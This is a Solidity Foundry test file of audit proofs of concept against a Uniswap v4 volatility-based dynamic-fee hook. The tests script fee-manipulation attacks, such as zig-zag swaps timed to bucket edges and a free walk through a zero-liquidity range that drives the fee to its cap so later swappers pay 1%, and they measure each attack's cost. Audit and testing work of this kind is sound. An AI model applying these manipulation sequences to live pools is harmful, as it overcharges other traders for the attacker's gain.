// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {VolatilityFeeHook} from "../src/VolatilityFeeHook.sol";
import {VolatilityMath} from "../src/libraries/VolatilityMath.sol";
import {HookTestBase} from "./utils/HookTestBase.sol";

/// hook-auditor re-audit PoCs (round 2). Run with -vv.
contract ReAuditTest is HookTestBase {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    function setUp() public {
        _baseSetUp();
    }

    function _bal(PoolKey memory k) internal view returns (uint256) {
        return k.currency0.balanceOfSelf() + k.currency1.balanceOfSelf();
    }

    /// smallest sqrtPrice whose logPrice is `milli`
    function _firstPriceAtLog(int256 milli) internal pure returns (uint160 p) {
        int256 tick = milli / 1000;
        int256 frac = milli % 1000;
        if (frac < 0) { tick -= 1; frac += 1000; }
        uint256 lo = TickMath.getSqrtPriceAtTick(int24(tick));
        uint256 hi = TickMath.getSqrtPriceAtTick(int24(tick) + 1);
        uint256 w = hi - lo;
        p = uint160(lo + (uint256(frac) * w + 999) / 1000);
        require(VolatilityMath.logPrice(p) == milli, "first: at");
        require(VolatilityMath.logPrice(p - 1) == milli - 1, "first: below");
    }

    // ---------------------------------------------------------------- A. python port cross-check
    function test_reaudit_logPrice_samples() public pure {
        uint160[8] memory ps = [
            uint160(4295128739), 4295128740, 4295464401, 79228162514264337593543950336,
            79228162514264337593543950335, 1461446703485210103287273052203988822378723970341,
            12907368660193052075151, 5144189877360250657688527238323766705410326
        ];
        for (uint256 i; i < ps.length; i++) { console2.log("LP", uint256(ps[i])); console2.logInt(int256(VolatilityMath.logPrice(ps[i]))); }
    }

    // ---------------------------------------------------------------- B. H-1 re-attack: quantisation
    /// zig-zag aligned to every bucket boundary between A = (first price of milli m0) - 1 unit and
    /// B = first price of milli (m0 + k - 1): the hook READS k milli-ticks, the real move is (k-1) milli + 1 unit
    function test_reaudit_H1_quantisedZigzag() public {
        for (uint256 k = 1; k <= 8; k++) {
            uint256 snap = vm.snapshotState();
            uint160 a = _firstPriceAtLog(0) - 1;
            uint160 b = _firstPriceAtLog(int256(k) - 1);
            _moveToPrice(hookKey, a);
            _nextBlock(BUCKET);
            _swap(hookKey, true, -1); // observe; fee floor
            uint256 bal = _bal(hookKey);
            uint256 maxVar; uint24 maxFee;
            for (uint256 i; i < 600; i++) {
                // last block of the bucket: move; first block of next bucket: move back (which also observes)
                vm.roll(block.number + 49); vm.warp(block.timestamp + 9);
                _moveToPrice(hookKey, i % 2 == 0 ? b : a);
                vm.roll(block.number + 1); vm.warp(block.timestamp + 1);
                uint24 f = hook.currentFee(hookId);
                if (f > maxFee) maxFee = f;
                // realise the observation with a 1-wei swap so the state is written
                _moveToPrice(hookKey, i % 2 == 0 ? b - 1 : a + 1);
                _moveToPrice(hookKey, i % 2 == 0 ? b : a);
                uint256 v = _state().variance;
                if (v > maxVar) maxVar = v;
            }
            console2.log("quantised zigzag k (read milli-ticks per bucket):", k);
            console2.log("   max fee / max variance / total token cost wei over 600 buckets:", maxFee, maxVar, bal - _bal(hookKey));
            vm.revertToState(snap);
        }
    }

    // ---------------------------------------------------------------- C. cheapest lift, non-LP, deep full-range pool
    function test_reaudit_costToLift_notLp() public {
        uint256[7] memory ds = [uint256(40), 1000, 2000, 20_000, 100_000, 200_000, 380_000]; // milli-ticks
        console2.log("D(milli) | G pips | loss immediate-unwind wei | ratio x1000 | loss patient-unwind wei | ratio x1000   (ratio = loss / (G*L*1e-9), claim >= 900)");
        for (uint256 i; i < ds.length; i++) {
            uint256 lossFast; uint256 lossSlow; uint256 g;
            {
                uint256 snap = vm.snapshotState();
                uint160 p0 = _sqrtPrice(hookKey);
                uint256 bal = _bal(hookKey);
                vm.roll(block.number + 49); vm.warp(block.timestamp + 9); // last second of the bucket
                assertEq(block.timestamp % 10, 9);
                _moveToLog(hookKey, int256(ds[i]));
                vm.roll(block.number + 1); vm.warp(block.timestamp + 1); // first block of next bucket
                g = hook.currentFee(hookId) - MIN_FEE;
                _moveToPrice(hookKey, p0);
                lossFast = bal - _bal(hookKey);
                vm.revertToState(snap);
            }
            {
                uint256 snap = vm.snapshotState();
                uint160 p0 = _sqrtPrice(hookKey);
                uint256 bal = _bal(hookKey);
                vm.roll(block.number + 49); vm.warp(block.timestamp + 9);
                _moveToLog(hookKey, int256(ds[i]));
                vm.roll(block.number + 1); vm.warp(block.timestamp + 1);
                (, uint24 charged) = _swap(hookKey, true, -1); // 1 wei: books the observation, fee now live for everybody
                assertEq(charged - MIN_FEE, g);
                vm.roll(block.number + 1); vm.warp(block.timestamp + 600 * 70); // wait it out
                _swap(hookKey, true, -1);
                assertEq(hook.currentFee(hookId), MIN_FEE);
                (, charged) = _moveToPrice(hookKey, p0);
                assertEq(charged, MIN_FEE);
                lossSlow = bal - _bal(hookKey);
                vm.revertToState(snap);
            }
            uint256 unit = g * 1e15; // G * L * 1e-9 with L = 1e24
            console2.log(ds[i], g);
            console2.log("     ", lossFast, unit == 0 ? 0 : lossFast * 1000 / unit);
            console2.log("     ", lossSlow, unit == 0 ? 0 : lossSlow * 1000 / unit);
        }
    }

    // ---------------------------------------------------------------- D. N-1: price next to a zero-liquidity region
    function test_reaudit_N1_liquidityEdge_freeLiftToCap() public {
        (Currency a, Currency b) = deployMintAndApprove2Currencies();
        (PoolKey memory k, PoolId id) = _initDynamicPool(a, b, TickMath.getSqrtPriceAtTick(0));
        // single-sided "launch" liquidity: 1e24 in [0, 6000), price exactly at the lower edge
        modifyLiquidityRouter.modifyLiquidity(k, ModifyLiquidityParams(0, 6000, 1e24, 0), ZERO_BYTES);
        assertEq(manager.getLiquidity(id), 1e24, "real in-range liquidity");

        // an honest first buy arms the pool and moves the price a little into the range
        _nextBlock(BUCKET);
        (, uint24 fee) = _swap(k, false, -1e18);
        assertEq(fee, MIN_FEE);
        assertTrue(hook.poolState(id).armed);
        uint160 pHonest = _sqrtPrice(k);

        // ---- attacker ----
        uint256 bal = _bal(k);
        _nextBlock(BUCKET - 1 + 0); // any later moment
        _moveToPrice(k, TickMath.getSqrtPriceAtTick(-50_000)); // sells back the 1e18 worth, then walks the void for free
        assertEq(manager.getLiquidity(id), 0);
        vm.roll(block.number + 1); vm.warp(block.timestamp / 10 * 10 + 10); // next bucket
        assertEq(hook.currentFee(id), MAX_FEE, "fee already at the cap for the next swap");
        _moveToPrice(k, pHonest); // attacker walks back (void is free), buys back what it sold
        uint256 afterBal = _bal(k);
        console2.log("N-1 attacker balance before / after (token0+token1 wei):", bal, afterBal);
        if (bal >= afterBal) console2.log("N-1 attacker net cost wei:", bal - afterBal);
        else console2.log("N-1 attacker net GAIN wei:", afterBal - bal);
        VolatilityFeeHook.PoolState memory s = hook.poolState(id);
        assertEq(s.fee, MAX_FEE);
        assertEq(manager.getLiquidity(id), 1e24);

        // victims in this bucket and the next pay 1%
        (, fee) = _swap(k, false, -1e18);
        assertEq(fee, MAX_FEE);
        _nextBlock(BUCKET);
        (, fee) = _swap(k, false, -1e18);
        assertEq(fee, MAX_FEE);
        _nextBlock(600);
        console2.log("N-1 fee 10 min later:", hook.currentFee(id));
        _nextBlock(3600);
        console2.log("N-1 fee 70 min later:", hook.currentFee(id));
    }

    /// same thing with the price exactly on the edge: zero tokens move at all
    function test_reaudit_N1_exactEdge_zeroTokens() public {
        (Currency a, Currency b) = deployMintAndApprove2Currencies();
        (PoolKey memory k, PoolId id) = _initDynamicPool(a, b, TickMath.getSqrtPriceAtTick(0));
        modifyLiquidityRouter.modifyLiquidity(k, ModifyLiquidityParams(0, 6000, 1e24, 0), ZERO_BYTES);
        uint256 bal = _bal(k);
        _nextBlock(BUCKET);
        _moveToPrice(k, TickMath.getSqrtPriceAtTick(-50_000)); // observation sees L = 1e24 -> armed at 0; swap is free
        assertTrue(hook.poolState(id).armed);
        _nextBlock(BUCKET);
        _moveToPrice(k, TickMath.getSqrtPriceAtTick(0));
        assertEq(_bal(k), bal, "attacker spent exactly nothing");
        assertEq(hook.poolState(id).fee, MAX_FEE);
        assertEq(manager.getLiquidity(id), 1e24);
        (, uint24 fee) = _swap(k, false, -1e18);
        assertEq(fee, MAX_FEE);
    }

    // ---------------------------------------------------------------- E. sole LP pushes, arbitrageur takes it
    function test_reaudit_soleLp_push_thenArbitraged() public {
        int256[4] memory ds = [int256(20), 100, 200, 380];
        console2.log("D ticks | fee next (pips) | push notional (token) | arb profit = sole-LP attacker loss (1e-6 token) | pips of notional");
        for (uint256 i; i < 4; i++) {
            uint256 snap = vm.snapshotState();
            vm.roll(block.number + 49); vm.warp(block.timestamp + 9);
            (BalanceDelta push,) = _moveToLog(hookKey, ds[i] * 1000);
            uint256 notional = uint256(uint128(-push.amount1()));
            vm.roll(block.number + 1); vm.warp(block.timestamp + 1);
            uint24 f = hook.currentFee(hookId);
            // arb sells token0 until the marginal price net of fee equals the outside price (tick 0)
            (BalanceDelta arb, uint24 charged) = _moveToLog(hookKey, int256(uint256(f)) * 10 + 20);
            assertEq(charged, f);
            int256 profit = int256(arb.amount1()) + int256(arb.amount0());
            console2.log(uint256(ds[i]), f, notional / 1e18);
            console2.log("      ", uint256(profit) / 1e12, uint256(profit) * 1e6 / notional);
            vm.revertToState(snap);
        }
    }

    // ---------------------------------------------------------------- F. stagnation / far future / same second
    function test_reaudit_longStagnation_and_edges() public {
        _moveTo(hookKey, 5000);
        _nextBlock(BUCKET);
        (, uint24 fee) = _swap(hookKey, true, -1);
        assertEq(fee, MAX_FEE);
        // same second, many blocks: no update
        bytes32 h = _stateHash(hookId);
        for (uint256 i; i < 5; i++) { vm.roll(block.number + 1); _swap(hookKey, i % 2 == 0, -1); assertEq(_stateHash(hookId), h); }
        // 9 more seconds: still same bucket
        vm.warp(block.timestamp + 9); vm.roll(block.number + 45);
        _swap(hookKey, true, -1); assertEq(_stateHash(hookId), h);
        vm.warp(block.timestamp + 1); vm.roll(block.number + 1);
        _swap(hookKey, true, -1); assertTrue(_stateHash(hookId) != h);
        // one year idle after a 300-tick move in the last traded bucket: first swap pays for it
        _moveTo(hookKey, 5300);
        vm.warp(block.timestamp + 365 days); vm.roll(block.number + 1);
        (, fee) = _swap(hookKey, true, -1);
        console2.log("fee of first swap after a year idle (300-tick move left unbooked):", fee);
        // far future timestamps do not revert
        vm.warp(type(uint48).max - 5); vm.roll(block.number + 1);
        _swap(hookKey, true, -1);
        // clock going backwards: no revert, no update
        h = _stateHash(hookId);
        vm.warp(T0);
        _swap(hookKey, true, -1);
        assertEq(_stateHash(hookId), h);
    }

    // ---------------------------------------------------------------- G. sole LP: self-shielding zig-zag to the cap
    /// the test contract owns ALL liquidity of hookKey. Each bucket: one swap, displacement chosen so that
    /// displacement (ticks*100 pips) < the LP fee that will be charged while it is exposed => no arbitrage possible.
    function test_reaudit_soleLp_selfShieldedZigzag() public {
        uint256 bal = _bal(hookKey);
        int256 pos; // current milli
        uint256 worstMarginPips = type(uint256).max; // min over buckets of (fee - displacement) in pips
        uint256 bucketsToCap;
        for (uint256 n; n < 400; n++) {
            uint24 fNow = hook.currentFee(hookId);
            // amplitude: 41 ticks once shielded, otherwise as much as the fee of the NEXT bucket will shield
            // next fee >= 500 + 25*d  => need 100*d < 500 + 25*d  => d < 6.67 ticks when starting from the floor;
            // in general allow d (milli) s.t. d/10 pips < current fee (conservative: next fee >= decayed current)
            int256 d = int256(uint256(fNow) * 10 * 97 / 100); // milli-ticks, 3% below current fee equivalence
            if (d > 41_000) d = 41_000;
            int256 target = pos == 0 ? d : int256(0);
            if (pos != 0 || d != 0) { _moveToLog(hookKey, target); }
            uint256 disp = uint256(target >= 0 ? target : -target); // displacement from the outside price (0)
            pos = target;
            _nextBlock(BUCKET);
            uint24 fNext = hook.currentFee(hookId);
            // while the price sits `disp` milli-ticks away during this new bucket, an arb needs disp/10 pips > fee
            if (disp != 0) {
                assertGt(uint256(fNext), disp / 10, "displacement is inside the fee: no arbitrage");
                if (uint256(fNext) - disp / 10 < worstMarginPips) worstMarginPips = uint256(fNext) - disp / 10;
            }
            if (fNext >= 9900 && bucketsToCap == 0) bucketsToCap = n + 1;
        }
        if (pos != 0) _moveToLog(hookKey, 0);
        uint256 gross = bal - _bal(hookKey);
        modifyLiquidityRouter.modifyLiquidity(hookKey, ModifyLiquidityParams(WIDE_LOWER, WIDE_UPPER, 0, 0), ZERO_BYTES);
        uint256 afterBal = _bal(hookKey);
        console2.log("sole-LP shielded zigzag: fee now (pips):", hook.currentFee(hookId), " buckets until fee >= 9900:", bucketsToCap);
        console2.log("   fees paid as swapper (wei):", gross);
        if (bal >= afterBal) console2.log("   net cost after collecting own LP fees (wei):", bal - afterBal);
        else console2.log("   net GAIN (wei):", afterBal - bal);
        console2.log("   worst (fee - displacement) margin, pips:", worstMarginPips);
    }
}
